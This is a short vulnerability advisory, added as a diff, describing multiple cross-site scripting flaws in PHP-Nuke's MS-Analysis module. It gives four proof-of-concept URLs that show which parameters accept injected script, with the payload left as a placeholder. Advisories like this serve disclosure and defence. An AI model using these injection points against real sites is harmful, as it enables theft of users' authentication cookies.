@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/9947/info
+
+It has been reported that MS-Analysis is prone to a multiple cross-site scripting vulnerabilities. These issues are due to a failure of the application to properly sanitize user supplied URI parameters.
+
+These issues could permit a remote attacker to create a malicious link to the vulnerable application that includes hostile HTML and script code. If this link were followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.
+
+http://www.example.org/nuke70/modules.php?name=MS_Analysis&file=index&op=MSAnalysisGeneral&screen=>[xss_code_here]&overview=1&sortby=
+http://www.example.org/nuke70/modules/MS_Analysis/title.php?module_name=>[xss_code_here]
+http://www.example.org/nuke70/modules.php?name=MS_Analysis&file=index&op=MSAnalysisGeneral&screen=3&overview=1&sortby=>[xss_code_here]
+http://www.example.org/nuke70/modules.php?name=MS_Analysis&file=index&op=MSAnalysisGeneral&screen=13&overview=>[xss_code_here]&sortby=
